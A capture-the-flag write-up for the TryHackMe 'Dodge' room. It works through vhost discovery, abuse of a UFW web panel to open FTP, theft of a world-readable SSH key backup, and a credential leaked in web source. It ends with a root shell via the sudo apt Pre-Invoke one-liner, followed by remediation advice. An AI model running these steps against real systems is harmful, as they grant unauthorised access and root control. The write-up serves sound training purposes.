# TryHackMe — Dodge · Writeup

> **Platform:** TryHackMe  **Theme:** Network evasion / pivoting
> **Target:** `dodge.thm`  **OS:** Ubuntu 20.04.3 LTS
> **Result:** `user.txt` + `root.txt` obtained
>
> Sensitive values (credentials, flags) in this writeup are **partially redacted**.

---

## TL;DR — Attack chain

```
vhost/SAN recon
   └─▶ netops-dev "Firewall" panel  (UFW web front-end, allowlist-gated)
        └─▶ legit function abuse:  sudo ufw allow ftp   → opens the deliberately-denied port 21
             └─▶ anonymous FTP (active mode)  → world-readable id_rsa_backup
                  └─▶ ssh challenger  → user.txt
                       └─▶ posts.php leaks cobra's SSH password (world-readable source)
                            └─▶ su cobra
                                 └─▶ sudo NOPASSWD /usr/bin/apt  (GTFOBins) → root.txt
```

The whole box is solved with **zero novel exploits** — every step is abuse of intended
functionality, a misconfiguration, or an exposed/reused secret.

| Phase | Technique | Reference |
|-------|-----------|-----------|
| Recon | vhost map via TLS cert SAN | — |
| Foothold prep | UFW web-panel allowlist bypass by design (legit `sudo ufw` command) | — |
| Foothold prep | FTP data-channel vs firewall (active mode) | — |
| Foothold | World-readable backup of a protected private key | CWE-552 / CWE-732 |
| User | SSH key auth | — |
| Lateral | Credentials in world-readable web source | CWE-538 / CWE-260 |
| Root | `sudo` NOPASSWD on `apt` | GTFOBins, CWE-250 |

---

## 1. Recon

### 1.1 Port scan

```bash
nmap -sCV -O -Pn -p- dodge.thm
```

Only **three** ports answer; the other 65,532 are `filtered` (dropped, not closed):

| Port | Service |
|------|---------|
| 22/tcp | OpenSSH |
| 80/tcp | Apache httpd 2.4.41 (Ubuntu) |
| 443/tcp | Apache httpd 2.4.41 (Ubuntu), TLS |

The mass of *filtered* ports is the first hint of the room's theme: a host firewall
(UFW) dropping everything except a small allow-list — meaning services are being
deliberately hidden behind it.

### 1.2 Virtual-host discovery via the TLS certificate

Both `80` and `443` return **403 Forbidden** on a raw request. This is name-based virtual
hosting: a non-matching `Host:` header falls through to a default vhost that denies. The
question becomes *which hostnames are valid* — and the self-signed certificate answers it
for free. Its Subject Alternative Names leak the full intended vhost map:

```
dodge.thm, www.dodge.thm, blog.dodge.thm, dev.dodge.thm,
touch-me-not.dodge.thm, netops-dev.dodge.thm, ball.dodge.thm
```

Add them all to `/etc/hosts`, then triage each over HTTPS (`-k` for the self-signed cert):

| VHost | Status | Size | Note |
|-------|--------|------|------|
| `www` | 200 | 7,111 B | landing page |
| `dev` | 200 | 82,291 B | largest app, big surface |
| `netops-dev` | 200 | 743 B | tiny — a single form/tool |
| `blog` | 403 | 280 B | default-forbidden |
| `ball` | 403 | 280 B | default-forbidden (byte-identical to blog) |
| `touch-me-not` | 403 | 288 B | default-forbidden |

> **Note (resolved later, post-root):** the 403 trio (`blog`, `ball`, `touch-me-not`) are
> **red herrings**. They exist only in the certificate SAN — there is *no* vhost config for
> them, so they fall through to a default vhost that hard-codes `Redirect 403 /`. A cert SAN
> lists *intended* names, not necessarily *live* vhosts. See §9.

`netops-dev` — network-ops naming plus a tiny body — is the priority.

---

## 2. The `netops-dev` firewall panel

`netops-dev.dodge.thm` serves a page titled **"Firewall - Upload Logs"** with a hidden
(`display:none`) upload form and two scripts. `firewall.js` contains a commented-out
`fetch()` that leaks the real backend endpoint:

```javascript
// fetch('firewall10110.php', { method: 'GET', ... })
```

`cf.js` is just minified jQuery 2.1.3 (dead end). Hitting the leaked endpoint directly:

```bash
curl -sk https://netops-dev.dodge.thm/firewall10110.php
```

returns a **"Firewall - Status"** page: a live `ufw status verbose` dump plus a form:

```html
<form method="post" action="firewall10110.php">
  <label for="command">UFW Command:</label>
  <input type="text" name="command" placeholder="sudo command parameter" required>
</form>
```

The UFW rules confirm the theme — only `22/80/443` are allowed inbound, **`21` is
explicitly `DENY`** (not merely default-deny), and everything else is dropped by the default
incoming policy.

---

## 3. Filter analysis — the core of the room

The `command` field clearly feeds a `sudo ufw <input>` execution, so the instinct is OS
command injection (WSTG-INPV-12 / CWE-78). It is **not** — and understanding *why* is the
whole puzzle.

**Step 1 — everything is rejected.** Bare inputs return `Invalid command`, including a
perfectly clean UFW command with zero metacharacters:

```
command=status      → Invalid command
command=allow 9999  → Invalid command   (and no rule appears in the status dump)
```

Because even a *clean* command is rejected, the validator is an **allowlist** (it rejects by
command shape), **not** a metacharacter blacklist.

**Step 2 — find the accepted shape.** The placeholder `sudo command parameter` turns out to
be a literal hint. The allowlist requires the prefix **`sudo ufw`**:

```
command=sudo ufw allow 21   → Rule updated / Rule updated (v6)   ✅
command=sudo ufw allow ftp  → Rule updated                        ✅
```

**Step 3 — injection is dead.** With a valid prefix in hand, separators still fail:

```
command=sudo ufw allow ftp; id   → Invalid command
```

The `;` breaks the allowlist, so the validator checks the **full ufw-argument shape**
(anchored parse), not just the prefix. Command injection through this field is closed.

> **Takeaway:** the intended path is not injection but **legitimate abuse of the panel's
> function** — it is a UFW front-end, so it can *open the firewall*.

---

## 4. Opening FTP (legit function abuse)

Port 21 was explicitly denied — a deliberate signal that a live service sits behind it.
Use the panel to allow it:

```bash
curl -sk -X POST https://netops-dev.dodge.thm/firewall10110.php \
     --data-urlencode "command=sudo ufw allow ftp"
# → Rule updated / Rule updated (v6)
```

The status dump flips to `21 ALLOW IN`. Confirm the service:

```bash
nmap -p21 -sV -Pn netops-dev.dodge.thm
# 21/tcp open  ftp  vsftpd 2.0.8 or later   banner: "220 Welcome to Dodge FTP service"
```

> **UFW rule-order note:** a plain `allow` appends *below* an existing `deny`
> (first-match-wins), so in the general case you would need `insert 1 allow 21/tcp` or
> `delete deny 21`. Here the deny was replaced cleanly and 21 opened directly.

---

## 5. FTP foothold — the data-channel trap

Anonymous login works:

```bash
ftp netops-dev.dodge.thm
# Name: anonymous   Password: <empty>   → 230 Login successful
```

…but `ls` **hangs** at `229 Entering Extended Passive Mode (|||<random-high-port>|)`.

**Mechanism (full-circle room design):** FTP uses two connections — a *control* channel
(port 21, now open) and a separate *data* channel. In **passive mode** the server tells the
client to connect back to a random high port for the listing/transfer — and those ports land
squarely in the UFW-filtered range, so the firewall drops the data connection. Opening 21
only fixed the control channel.

**Fix — active mode.** In active mode the *server* dials back to the client (from port 20);
the box's outbound policy is `allow`, so this sidesteps the filtered passive ports entirely:

```bash
ftp -A netops-dev.dodge.thm
# 200 EPRT command successful   → ls now works
```

*(Alternative, in keeping with the theme: open the passive range with the panel —
`sudo ufw allow 1024:65535/tcp`.)*

### 5.1 What's in the FTP root

The anonymous root is a user's home directory:

```
-r--------  1 1003 1003    38  user.txt        ← 0400, owner-only
drwxr-xr-x  2 1003 1003  4096  .ssh/
-rwxr-xr-x  1 1003 1003    87  .bash_history
...
```

`get user.txt` → **`550 Failed to open file`**. This is *not* a channel problem (the listing
proves the channel works) — it's a **permissions** denial: `user.txt` is `0400` and the
anonymous FTP session is not its owner. The move is to *become* that user, not to fix the
download.

### 5.2 The key backup

`.ssh/` holds three files:

```
-rwxr-xr-x  573  authorized_keys       ← world-readable; comment: challenger@thm-lamp
-r--------  2610 id_rsa                ← 0400 → get = 550 (same perms trap)
-rwxr-xr-x  2610 id_rsa_backup         ← 0755, WORLD-READABLE, identical size to id_rsa
```

Classic misconfiguration: the private key is protected, but a **world-readable backup** of
it is left beside it (CWE-552 / CWE-732). The `authorized_keys` comment gives the username:
**`challenger`**.

```bash
# via ftp:
get id_rsa_backup

# locally:
chmod 600 id_rsa_backup
ssh -i id_rsa_backup challenger@dodge.thm     # key is unencrypted, no passphrase
```

Shell as `uid=1003(challenger)` on Ubuntu 20.04.3. `user.txt` now reads (we're the owner):

```
THM{0649b2████████████████████████████}
```

---

## 6. Privilege escalation — enumeration & triage

```bash
id                                    # challenger only — NOT in docker group
sudo -l                               # asks for a password we don't have → blocked (for now)
cat ~/.bash_history                   # breadcrumb: `cat setup.php`, `cat posts.php`
find / -perm -4000 -type f 2>/dev/null
ss -tlnp
```

Findings and how each path was cut:

- **PwnKit (CVE-2021-4034)** — `pkexec` is SUID, but `policykit-1` is
  `0.105-26ubuntu1.3`, which is **higher** than the patched `0.105-26ubuntu1.2`
  (USN-5252-1). **Patched → dead.**
- **docker group** — `challenger` is not a member; the docker bridges are `DOWN`. **Out.**
- **`sudo`** — needs `challenger`'s password (unknown). Parked until we find creds.
- **Internal services** — `netstat`/`ss` show loopback-only listeners on `127.0.0.1:10000`
  and `127.0.0.1:45583`, unreachable externally. (Pivot practice; see §9.)
- **`.bash_history` breadcrumb** — `setup.php` and `posts.php` under the web app.

### 6.1 The credential leak

```bash
find / -name posts.php 2>/dev/null
# /var/www/notes/api/posts.php   (world-readable)
cat /var/www/notes/api/posts.php
```

The endpoint echoes a base64 blob that decodes to app "notes", one of which is literally
titled **"My SSH login"**:

```bash
echo '<base64-from-posts.php>' | base64 -d
# [... {"title":"My SSH login","content":"cobra / mz4%o7B███████"} ]
```

→ **`cobra` / `mz4%o7B███████`** (partially redacted).

*(`setup.php` in the same directory is `Permission denied` for challenger — not needed.)*

---

## 7. Lateral movement to `cobra`

Remote SSH as `cobra` refuses the password:

```bash
ssh cobra@dodge.thm
# Permission denied (publickey).      ← sshd offers publickey-only for cobra over the network
```

The password auth is disabled *over the network*, but local `su` uses PAM against the local
password database, so it still works:

```bash
su cobra          # password: mz4%o7B███████
id                # uid=1002(cobra)
```

---

## 8. Root — `sudo` NOPASSWD on `apt`

```bash
sudo -l
# User cobra may run the following commands:
#     (ALL) NOPASSWD: /usr/bin/apt
```

`apt` can run external commands via its config hooks, and since `apt` itself runs as root
via `sudo`, the hook runs as root too — a textbook GTFOBins escalation. The
`APT::Update::Pre-Invoke` hook fires **before** any network activity, so it works even with
no internet:

```bash
sudo apt update -o APT::Update::Pre-Invoke::="/bin/bash"
# → root shell
```

> Note: the NOPASSWD entry is for `/usr/bin/apt` specifically, so call `apt` — not
> `apt-get` (a different binary not covered by the rule).

```bash
id            # uid=0(root)
cat /root/root.txt
# THM{7b88ac████████████████████████████}
```

Rooted. 🏁

---

## 9. Bonus — internal service & the SSH tunnel

As root, the loopback-only service on `127.0.0.1:10000` can be identified:

```bash
ss -tlnp | grep ':10000'          # → apache2 (NOT Webmin, as first guessed)
cat /etc/apache2/sites-enabled/*
```

The config resolves the last mysteries:

- `127.0.0.1:10000` → `DocumentRoot /var/www/notes`, `#ServerName notes.dodge.thm` — the
  **internal notes backend** (where `posts.php`/`setup.php` live), bound to loopback only.
- The default vhost hard-codes **`Redirect 403 /`** — which is why `blog`/`ball`/
  `touch-me-not` returned 403: they have **no vhost config** and fall through to it. Cert
  SAN ≠ live vhosts.

To reach the loopback service from the attacker box, use SSH **local port forwarding**:

```bash
# terminal 1 — hold the tunnel open (-N = no remote shell):
ssh -i id_rsa_backup -N -L 9000:127.0.0.1:10000 challenger@dodge.thm

# terminal 2 — the :10000 vhost has NO SSLEngine → it's plain HTTP, use http://:
curl -s http://localhost:9000/api/posts.php
```

**Two gotchas worth remembering:**
- `bind ... Address already in use` → the **left** port of `-L` is a listener on *your*
  machine; if it's taken (e.g. a stale tunnel), pick another local port or kill the holder.
- **Empty `curl` output** → you're likely speaking `https://` to an HTTP port; `-s`
  silently swallows the TLS-handshake error. Drop `-s` or add `-v` to see the real cause.

`-L` (local) vs `-R` (remote) vs `-D` (dynamic SOCKS) — pick `-L` for a single loopback
service, `-D` for pivoting into a whole subnet.

---

## 10. Lessons & remediation

**Why it worked (root causes):**
1. A firewall-management web panel let an unauthenticated user *open the firewall*
   (`sudo ufw allow ftp`) — abuse of intended functionality.
2. A protected private key had a **world-readable backup** beside it (CWE-552/CWE-732).
3. **Credentials sat in world-readable web source** (`posts.php`) — CWE-538/CWE-260.
4. `sudo` NOPASSWD on `apt` — a GTFOBins one-liner to root (CWE-250).

**Remediation:**
- Don't expose UFW control to the web; if you must, authenticate it and constrain it to a
  fixed, non-destructive command set — an allowlist that a valid value can't widen.
- Never leave a permissive backup of a secret; scope `.ssh` keys `0600`, owner-only.
- Keep secrets out of served source; use env/config outside the web root, restrict perms.
- Remove `apt` (and other GTFOBins binaries) from `sudo` rules; scope `sudo` narrowly.

**Reusable patterns reinforced:**
- TLS **cert SAN** as a free vhost-enumeration shortcut — but confirm names against real
  config before theorising about "hidden" services.
- FTP passive vs active behind a restrictive firewall (data channel ≠ control channel).
- A protected file with a permissive backup, and credentials in world-readable source, are
  recurring THM foothold/lateral patterns.
- Log the **ruled-out** branches (injection filtered, PwnKit patched, no docker group) — a
  clean decision tree is as valuable as the working path.
